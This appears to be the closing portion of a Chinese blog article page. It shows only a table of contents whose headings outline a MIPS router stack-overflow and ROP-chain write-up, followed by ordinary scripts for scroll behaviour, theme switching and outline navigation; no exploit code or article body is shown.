</button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-3"> <a href="#section-3">sessgetuid函数</a> </li><li class="article-outline__item depth-3" data-toc-id="section-4"> <a href="#section-4">sprintf</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-5"> <button class="article-outline__group-link" type="button" data-group-target="section-5"> <span>Firemae仿真路由器</span>  </button>  </li><li class="article-outline__group" data-group-id="section-6"> <button class="article-outline__group-link" type="button" data-group-target="section-6"> <span>gdb动态调试</span>  </button>  </li><li class="article-outline__group" data-group-id="section-7"> <button class="article-outline__group-link" type="button" data-group-target="section-7"> <span>确定返回地址偏移</span>  </button>  </li><li class="article-outline__group" data-group-id="section-8"> <button class="article-outline__group-link" type="button" data-group-target="section-8"> <span>构造rop链</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-9"> <a href="#section-9">mipsrop插件找gadget</a> </li><li class="article-outline__item depth-3" data-toc-id="section-10"> <a href="#section-10">exp</a> </li> </ol> </li> </ol> </div> </nav> </aside> <button class="article-toc-fab" id="article-toc-fab" type="button" aria-expanded="false" aria-controls="article-sidebar" aria-label="切换目录"> <span class="article-toc-fab__icon">☰</span> </button>  </div> </div>  </main> <script>
+      (() => {
+        const root = document.documentElement;
+        const scrollFlagKey = "scroll-to-top-once";
+
+        const bindScrollReset = () => {
+          try {
+            if ("scrollRestoration" in history) {
+              history.scrollRestoration = "manual";
+            }
+
+            if (sessionStorage.getItem(scrollFlagKey) === "1") {
+              sessionStorage.removeItem(scrollFlagKey);
+              requestAnimationFrame(() => window.scrollTo({ top: 0, left: 0, behavior: "auto" }));
+            }
+          } catch {}
+
+          document.addEventListener("click", (event) => {
+            const target = event.target;
+            if (!(target instanceof Element)) return;
+
+            const link = target.closest("a");
+            if (!(link instanceof HTMLAnchorElement)) return;
+
+            if (link.target && link.target !== "_self") return;
+            if (link.hasAttribute("download")) return;
+
+            const href = link.getAttribute("href");
+            if (!href || href.startsWith("#")) return;
+
+            try {
+              const url = new URL(link.href, window.location.href);
+              if (url.origin !== window.location.origin) return;
+              if (url.pathname === window.location.pathname && url.hash) return;
+              sessionStorage.setItem(scrollFlagKey, "1");
+            } catch {}
+          });
+        };
+
+        const bindToggle = () => {
+          const btn = document.getElementById("theme-toggle");
+          if (!btn) return;
+          const next = btn.cloneNode(true);
+          btn.replaceWith(next);
+          next.addEventListener("click", () => {
+            const current = root.getAttribute("data-theme") === "dark" ? "dark" : "light";
+            const value = current === "dark" ? "light" : "dark";
+            root.setAttribute("data-theme", value);
+            try {
+              localStorage.setItem("theme", value);
+            } catch {}
+          });
+        };
+
+        bindScrollReset();
+        bindToggle();
+      })();
+    </script> </body> </html>  <script>
+      (() => {
+        const shell = document.getElementById("article-shell");
+        const sidebar = document.getElementById("article-sidebar");
+        const fab = document.getElementById("article-toc-fab");
+        const outlineNav = sidebar?.querySelector(".article-outline__body");
+        const headings = Array.from(document.querySelectorAll(".article-content h2[id], .article-content h3[id]"));
+        const groupLinks = Array.from(document.querySelectorAll(".article-outline__group-link"));
+        const childLinks = Array.from(document.querySelectorAll(".article-outline__sublist a"));
+        const storageKey = "article-outline-open";
+
+        if (!shell || !sidebar || !fab || !outlineNav || !headings.length || !groupLinks.length) return;
+
+        let isOpen = false;
+        let activeId = "";
+        let activeGroupId = "";
+        let manualOpenGroupId = "";
+        let ticking = false;
+        let suppressOutlineScrollUntil = 0;
+
+        const syncState = () => {
+          shell.classList.toggle("article-shell--toc-expanded", isOpen);
+          shell.classList.toggle("article-shell--toc-collapsed", !isOpen);
+          sidebar.classList.toggle("is-open", isOpen);
+          fab.classList.toggle("is-open", isOpen);
+          fab.setAttribute("aria-expanded", String(isOpen));
+
+          try {
+            localStorage.setItem(storageKey, isOpen ? "1" : "0");
+          } catch {}
+        };
+
+        const groupMap = new Map(
+          groupLinks.map((link) => {
+            const id = link.getAttribute("data-group-target") || "";
+            return [id, link.closest(".article-outline__group")];
+          }),
+        );
+
+        let lastH2Id = "";
+        const headingMeta = headings.map((heading) => {
+          const depth = Number(heading.tagName.slice(1));
+          if (depth === 2) lastH2Id = heading.id;
+          return {
+            id: heading.id,
+            depth,
+            parentId: depth === 3 ? lastH2Id : "",
+            element: heading,
+          };
+        });
+
+        const pauseOutlineAutoScroll = (duration = 900) => {
+          suppressOutlineScrollUntil = Date.now() + duration;
+        };
+
+        const setActive = (id, parentId = "") => {
+          if (!id || (id === activeId && parentId === activeGroupId)) return;
+
+          activeId = id;
+          activeGroupId = parentId || id;
+
+          groupLinks.forEach((link) => {
+            const targetId = link.getAttribute("data-group-target") || "";
+            const isCurrentGroup = targetId === activeGroupId;
+            const isOpenGroup = targetId === activeGroupId || targetId === manualOpenGroupId;
+            link.toggleAttribute("aria-current", targetId === id && !parentId);
+            link.classList.toggle("is-current", targetId === id && !parentId);
+            link.classList.toggle("is-open", isOpenGroup);
+            link.classList.toggle("is-active-group", isCurrentGroup);
+          });
+
+          childLinks.forEach((link) => {
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            const isCurrent = targetId === id;
+            link.toggleAttribute("aria-current", isCurrent);
+            link.classList.toggle("is-current", isCurrent);
+          });
+
+          groupMap.forEach((group, groupId) => {
+            if (!group) return;
+            group.classList.toggle("is-open", groupId === activeGroupId || groupId === manualOpenGroupId);
+            group.classList.toggle("is-current", groupId === id && !parentId);
+          });
+
+          if (!isOpen || Date.now() < suppressOutlineScrollUntil) return;
+
+          const activeLink = [...groupLinks, ...childLinks].find((link) => {
+            const href = link.getAttribute("href");
+            if (href) return decodeURIComponent(href.replace(/^#/, "")) === id;
+            return (link.getAttribute("data-group-target") || "") === id;
+          });
+          if (!activeLink) return;
+
+          const linkTop = activeLink.offsetTop;
+          const linkBottom = linkTop + activeLink.offsetHeight;
+          const viewTop = outlineNav.scrollTop;
+          const viewBottom = viewTop + outlineNav.clientHeight;
+          const padding = 24;
+
+          if (linkTop - padding < viewTop) {
+            outlineNav.scrollTo({ top: Math.max(linkTop - padding, 0), behavior: "smooth" });
+          } else if (linkBottom + padding > viewBottom) {
+            outlineNav.scrollTo({
+              top: linkBottom - outlineNav.clientHeight + padding,
+              behavior: "smooth",
+            });
+          }
+        };
+
+        const updateOutline = () => {
+          ticking = false;
+
+          let current = headingMeta[0];
+          for (const heading of headingMeta) {
+            if (heading.element.getBoundingClientRect().top <= 160) {
+              current = heading;
+            } else {
+              break;
+            }
+          }
+
+          if (current) {
+            setActive(current.id, current.parentId);
+          }
+        };
+
+        const requestUpdate = () => {
+          if (ticking) return;
+          ticking = true;
+          window.requestAnimationFrame(updateOutline);
+        };
+
+        try {
+          isOpen = localStorage.getItem(storageKey) === "1";
+        } catch {
+          isOpen = false;
+        }
+
+        syncState();
+
+        groupLinks.forEach((button) => {
+          button.addEventListener("click", (event) => {
+            event.stopPropagation();
+            const groupId = button.getAttribute("data-group-target") || "";
+            if (!groupId) return;
+
+            if (manualOpenGroupId === groupId) {
+              manualOpenGroupId = "";
+            } else {
+              manualOpenGroupId = groupId;
+            }
+
+            if (activeGroupId) {
+              setActive(activeId || activeGroupId, activeGroupId);
+            }
+
+            const targetHeading = document.getElementById(groupId);
+            targetHeading?.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        childLinks.forEach((link) => {
+          link.addEventListener("click", (event) => {
+            event.preventDefault();
+            event.stopPropagation();
+
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            if (!targetId) return;
+
+            const targetMeta = headingMeta.find((item) => item.id === targetId);
+            if (!targetMeta) return;
+
+            pauseOutlineAutoScroll(1200);
+            setActive(targetMeta.id, targetMeta.parentId);
+
+            if (location.hash !== `#${targetId}`) {
+              history.pushState(null, "", `#${targetId}`);
+            }
+
+            targetMeta.element.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        fab.addEventListener("click", (event) => {
+          event.stopPropagation();
+          isOpen = !isOpen;
+          syncState();
+        });
+
+        sidebar.addEventListener("click", (event) => {
+          event.stopPropagation();
+        });
+
+        document.addEventListener("keydown", (event) => {
+          if (event.key === "Escape" && isOpen) {
+            isOpen = false;
+            syncState();
+            fab.focus();
+          }
+        });
+
+        window.addEventListener("scroll", requestUpdate, { passive: true });
+        window.addEventListener("resize", requestUpdate);
+        window.addEventListener("hashchange", requestUpdate);
+        requestUpdate();
+      })();
+    </script>
